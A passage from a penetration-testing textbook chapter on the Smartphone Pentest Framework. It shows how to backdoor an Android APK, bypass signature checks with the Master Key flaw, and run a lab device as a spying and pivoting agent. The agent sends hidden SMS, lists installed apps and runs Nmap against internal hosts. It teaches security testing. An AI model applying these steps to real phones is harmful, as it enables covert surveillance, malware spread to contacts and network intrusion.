Listing 20-13: Attaching SPF to the deployed agent
Choose option 1 at the main menu and then choose 1.) Attach Framework
to a Deployed Agent u. You are prompted for the path v, key w, and commu-
nication method x. Enter the values you used when creating the agent.
SPF will appear to hang for a minute as it waits for the agent to respond.
After it returns to the menu, you should be connected to the agent. Now
choose 2.) Send Commands to an Agent from the main menu. You will be pre-
sented with a list of agents in the database; you should see the agent you just
attached to SPF in the list as shown here.
spf> 2
Available Agents:
15555215556
Backdooring aPKs
Before we move on to using our deployed SPF agent, let’s look at another,
perhaps more sophisticated, way of creating an agent. Because you may not
always have the source code of the app you want to backdoor, SPF can work
with the precompiled APK file. Any APK, including those in the Google
Play store, are in scope.
Using the Smartphone Pentest Framework 461
To backdoor an APK with the SPF agent, choose 1 from the main menu,
and then 5.) Backdoor Android APK with Agent, as shown in Listing 20-14.
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key
spf> 5
APKTool not found! Is it installed? Check your config file
Install Android APKTool(y/N)?
spf> y
--2015-12-04 12:28:21-- https://android-apktool.googlecode.com/files/apktool-
install-linux-r05-ibot.tar.bz2
--snip--
Puts the Android Agent inside an Android App APK. The application runs
normally with extra functionality
APK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk
I: Baksmaling...
--snip--
Listing 20-14: Backdooring an APK
SPF does not install the APKTool program, required to decompile
APKs, by default; it asks if you want to install it. Enter y, and SPF will install
APKTool and continue.
When prompted, tell SPF to backdoor the APK /root/Smartphone-Pentest
-Framework/APKs/MapsDemo.apk (a compiled version of the Google Maps
demo code used previously). SPF will then decompile the APK, combine it
with the SPF agent, and recompile it.
To set up the agent, SPF needs to know the control phone number,
control key, and control path. This is the same information we used when
backdooring source code and is shown in Listing 20-15.
Phone number of the control modem for the agent: 15555215554
Control key for the agent: KEYKEY1
Webserver control path for agent: /androidagent1
Control Number: 15555215554
Control Key:KEYKEY1
ControlPath:/androidagent1
Is this correct?(y/n) y
--snip--
Listing 20-15: Setting options
462 Chapter 20
After APKTool recompiles the backdoored APK, we need to sign it. At
installation, the Android device checks the signatures on an APK. If it is not
signed, it will be rejected, even by an emulator. Google Play apps are signed
using a developer key registered with Google Play.
To run apps on emulators and devices that are not restricted to Google
Play apps, we just use a debug key that is not registered with Google, but the
app still must be signed. We were able to skip this step when backdooring
source code because we compiled the code with the Android SDK, which
automatically signed our code with the default Android keystore. Because
we used APKTool here, we need to manually re-create the signature.
You will be asked whether you want to use the Android Master Key
vulnerability, which allows attackers and pentesters to trick the Android
signature-verification process into thinking our app is a legitimate update
to an already installed application. In other words, we will be allowed to
replace legitimate applications with our code, and the Android system will
view them as legitimate updates from the vendor. (This flaw in the verifi-
cation process was fixed in Android 4.2.) To use the Android Master Key
vulnerability, enter y at the prompt, as shown next.
note To leverage this issue, the original application and its signatures are copied into our
backdoored APK. Details about how this triggers the Master Key vulnerability can be
found here: http://www.saurik.com/id/17.
Use Android Master Key Vuln?(y/N): y
Archive: /root/Desktop/abcnews.apk
--snip--
Inflating: unzipped/META-INF/CERT.RSA
To see the Android Master Key vulnerability at work, install the legiti-
mate version of MapsDemo.apk from /root/Smartphone-Pentest-Framework/APKs
onto a device running an Android version earlier than 4.2, and then try to
install the backdoored version you just created by delivering it via SMS or
NFC with SPF. You should be prompted to replace MapsDemo.apk, and the
signature verification should succeed, even though we didn’t have access
to the private keys required to build a correct signature for our backdoored
version.
If your target is not vulnerable to Master Key or the app is not already
on the target device, you can just sign the app with your default key for the
Android keystore on Kali. To do this, enter n at the prompt for Use Android
Master Key Vuln, as shown in Listing 20-16.
Use Android Master Key Vuln?(y/N): n
Password for Debug Keystore is android
Enter Passphrase for keystore:
--snip--
signing: resources.arsc
Listing 20-16: Signing the APK
Using the Smartphone Pentest Framework 463
You are prompted for the password for the debug keystore. By default,
this action does not sign the APK with a key for publishing it on Google
Play, but it will work for our purposes. The app is now signed with a debug
key and should install on any device that does not restrict apps to official
Play Store apps. Note that there’s nothing stopping a pentester from signing
the app with a legitimate Google Play key they have registered if it’s in the
scope of the pentest to attempt to trick users into downloading malicious
apps from the Google Play store.
note The backdoored APK is functionality equivalent to the agent we created in “Backdooring
Source Code” on page 459 and can be deployed the same way. Of course, we already
have a deployed agent to work with as we look at what we can do to a device and its
local network after an agent is deployed.
mobile Post exploitation
Now that we’re on the device, we have a few options open to us. We can
gather local information from the device such as contacts or received SMS
messages, and we can remotely control the device to have it do things like
take a picture. If we’re unsatisfied with our permissions, we can attempt
to perform privilege escalation on the device and get root privileges. We
can even use the exploited mobile device to attack other devices on the
network. (This attack can be particularly interesting if the device connects
directly to a corporate network or uses a VPN to access one.)
Information Gathering
We will run an example of information gathering by getting a list of
installed applications on the infected device as shown in Listing 20-17.
spf> 2
View Data Gathered from a Deployed Agent:
Available Agents:
1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1u
Commands:v
1.) Send SMS
2.) Take Picture
3.) Get Contacts
4.) Get SMS Database
5.) Privilege Escalation
6.) Download File
7.) Execute Command
8.) Upload File
9.) Ping Sweep
10.) TCP Listener
11.) Connect to Listener
12.) Run Nmap
464 Chapter 20
13.) Execute Command and Upload Results
14.) Get Installed Apps List
15.) Remove Locks (Android  14w
Gets a list of installed packages(apps) and uploads to a file.
Delivery Method(SMS or HTTP): HTTPx
Listing 20-17: Running a command on an agent
Choose option 2 from the main menu, then select the agent from the
list u. When presented with a list of available agent functionality v, choose
14.) Get Installed Apps List w. SPF asks how you would like to deliver the
command; we’ll use HTTP x. (Recall that agents can communicate and
receive commands via HTTP and SMS.)
Enter 0 to return to the previous menu until you reach the main menu.
Wait a minute, and then choose 3.) View Information Gathered, as shown in
Listing 20-18.
spf> 3
View Data Gathered from a Deployed Agent:
Agents or Attacks? Agentsu
Available Agents:
1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1v
Data:
SMS Database:
Contacts:
Picture Location:
Rooted:
Ping Sweep:
File:
Packages: package:com.google.android.locationw
--snip--
package:com.android.providers.downloads
package:com.android.server.vpn
Listing 20-18: Viewing gathered data
You are asked if you want to see the results of Attacks or Agents; type
Agents u. Choose our agent v. Information about the device is pulled from
the database, though currently all we have is a list of installed apps, gathered
by the previous command w. (You can run additional information-gather-
ing commands to fill in more entries.)
Remote Control
Now let’s see how to use the agent to remotely control the device. We can tell
the device to send a text message that will not show up in the sent messages
of the SMS app. In fact, the user will have no indication that a message
Using the Smartphone Pentest Framework 465
was sent at all—what better way to exploit the circle of trust? Perhaps we
can grab all the user’s contacts and send them messages telling them they
should install our cool app, which just so happens to point to the SPF agent.
Because the message comes from someone they know, the users will be more
likely to install the agent.
Let’s just send an example message for now, as shown in Listing 20-19.
Commands:
--snip--
Select a command to perform or 0 to return to the previous menu
spf> 1u
Send an SMS message to another phone. Fill in the number, the message to send,
and the delivery method(SMS or HTTP).
Number: 15555215558
Message: hiya Georgia
Delivery Method(SMS or HTTP) SMS
Listing 20-19: Remotely controlling an agent
From the agent commands menu, select option 1.) Send SMS u. When
prompted for a phone number, message contents, and how you want to
deliver the command, tell your agent to send the message to the Android 2.1
emulator.
Your Android 2.1 emulator will receive an SMS with the text you entered
from the Android 2.2 emulator, with no indication on either emulator that
this is not a normal message.
Pivoting Through Mobile Devices
Mobile Device Management (MDM) and mobile antivirus applications have
a long way to go. The number of companies that mandate these solutions
for their employees is still small when compared with many other security
controls, and some companies choose not to allow mobile devices at all.
But let’s face it: Employees probably know the company’s wireless pass-
word. Connect your mobile device, and magically it’s a member of the same
network as your workstation and other devices that might contain sensitive
information.
Naturally, companies are much better at hardening their externally
facing assets. After all, these devices are open to attack from anyone on
the Internet, and they get the lion’s share of the attention. But internally,
things start to break down. Weak passwords, missing patches, and out-of-date
client-side software are all issues we’ve examined in this book that could be
lurking in the internal network. If an exploited mobile device has direct
network access to these vulnerable systems, we may be able to use it as a
pivot to launch additional attacks, completely bypassing the perimeter.
We studied pivoting in Chapter 13, when we used an exploited machine
to move from one network to another. We can do the same thing here
using the SPF agent, effectively running a pentest on the mobile network
through the exploited mobile device, as illustrated in Figure 20-4.
466 Chapter 20
attacker
Internet
local router
local infected
phone local PC
Figure 20-4: Pivoting through an infected
mobile device to attack internal devices
Portscanning with Nmap
We start by seeing what devices are out there using an agent command option
to ping sweep the local network. Next, we’ll do some port scanning, as dis-
cussed in Chapter 5. As it turns out you can install Nmap Android binaries
on the exploited device. SPF has install scripts for this and other supporting
tools. Choose option 10.) Install Stuff from the main menu, and tell SPF to
install Nmap for Android, as shown in Listing 20-20.
spf> 10
What would you like to Install?
1.) Android SDKS
2.) Android APKTool
3.) Download Android Nmap
spf> 3
Download Nmap for Android(y/N)?
spf> y
Listing 20-20: Installing Nmap for Android
Now to run Nmap from our Android agent using option 12.) Run Nmap.
Let’s run Nmap against our Windows XP target u, as shown in Listing 20-21.
Make sure that the War-FTP program we exploited in Chapters 17 and 18
is still running. (We’ll exploit it through the pivot in the next section.)
Using the Smartphone Pentest Framework 467
Select a command to perform or 0 to return to the previous menu
spf> 12
Download Nmap and port scan a host of range. Use any accepted format for
target specification in Nmap
Nmap Target: 192.168.20.10u
Delivery Method(SMS or HTTP) HTTP
Listing 20-21: Running Nmap from Android
Let Nmap run for a couple of minutes, and then check your agent’s
gathered information. You should notice that the File field links to /root/
Smartphone-Pentest-Framework/frameworkconsole/text.txt. View the contents of
this file—you should see something similar to Listing 20-22.
# Nmap 5.61TEST4 scan initiated Sun Sep 6 23:41:30 2015 as: /data/data/com.example.android.google
.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10
Nmap scan report for 192.168.20.10